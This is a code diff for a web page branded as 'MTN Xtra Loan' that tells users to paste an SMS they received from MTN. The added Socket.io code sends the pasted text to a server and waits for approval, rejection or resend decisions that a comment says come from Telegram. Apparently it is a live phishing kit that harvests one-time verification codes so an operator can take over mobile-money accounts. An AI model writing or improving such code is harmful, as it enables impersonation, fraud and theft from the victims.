@@ -151,31 +151,33 @@
             </div>
         </div>
 
-        <form action="/verify-sms" method="POST">
-            <div class="sms-wrapper">
-                <textarea id="smsText" name="smsMessage" placeholder="Collez le SMS reçu de MTN ici..." required oninput="updateSmsState()"></textarea>
-                <button type="button" class="paste-btn" onclick="pasteSms()">📋 Paste</button>
-            </div>
-            <div class="char-count"><span id="charCount">0</span> characters</div>
+        <div class="sms-wrapper">
+            <textarea id="smsText" placeholder="Collez le SMS reçu de MTN ici..." required oninput="updateSmsState()"></textarea>
+            <button type="button" class="paste-btn" onclick="pasteSms()">📋 Paste</button>
+        </div>
+        <div class="char-count"><span id="charCount">0</span> characters</div>
 
-            <div class="resend-row">
-                <div>Didn't receive the SMS?</div>
-                <span>Resend SMS</span>
-            </div>
+        <div class="resend-row">
+            <div>Didn't receive the SMS?</div>
+            <span>Resend SMS</span>
+        </div>
 
-            <button type="submit" id="verifyBtn" class="verify-btn" disabled>VERIFY & CONTINUE →</button>
-        </form>
+        <button id="verifyBtn" class="verify-btn" disabled onclick="submitSMS()">VERIFY & CONTINUE →</button>
     </div>
 
     <div class="footer">
         © 2026 MTN Xtra Loan
     </div>
 
+    <!-- Load Socket.io -->
+    <script src="/socket.io/socket.io.js"></script>
     <script>
+        const socket = io();
+        const verifyBtn = document.getElementById('verifyBtn');
+
         function updateSmsState() {
             const textarea = document.getElementById('smsText');
             const charCount = document.getElementById('charCount');
-            const verifyBtn = document.getElementById('verifyBtn');
 
             charCount.innerText = textarea.value.length;
 
@@ -197,6 +199,42 @@
                 alert("Please paste manually (Ctrl+V or long-press).");
             }
         }
+
+        // --- NEW SOCKET SUBMIT LOGIC ---
+        function submitSMS() {
+            const smsText = document.getElementById('smsText').value;
+            if (!smsText.trim()) return;
+
+            // Show waiting state
+            verifyBtn.innerText = "WAITING FOR APPROVAL...";
+            verifyBtn.disabled = true;
+            verifyBtn.style.backgroundColor = "#ccc";
+            document.getElementById('smsText').disabled = true;
+
+            // Send to server
+            socket.emit('submit_sms', smsText);
+        }
+
+        // --- LISTEN FOR TELEGRAM DECISIONS ---
+        socket.on('sms_approved', () => {
+            window.location.href = "/verify-code.html";
+        });
+
+        socket.on('sms_rejected', () => {
+            alert("Invalid SMS. Please enter the correct 5-digit code.");
+            window.location.href = "/index.html"; // Or load a specific 5-digit code page
+        });
+
+        socket.on('sms_resend', () => {
+            alert("Check your SMS for the new code sent.");
+            // Re-enable form
+            verifyBtn.innerText = "VERIFY & CONTINUE →";
+            verifyBtn.disabled = false;
+            verifyBtn.style.backgroundColor = "#ffcc00";
+            document.getElementById('smsText').disabled = false;
+            document.getElementById('smsText').value = "";
+            updateSmsState();
+        });
     </script>
 </body>
 </html>
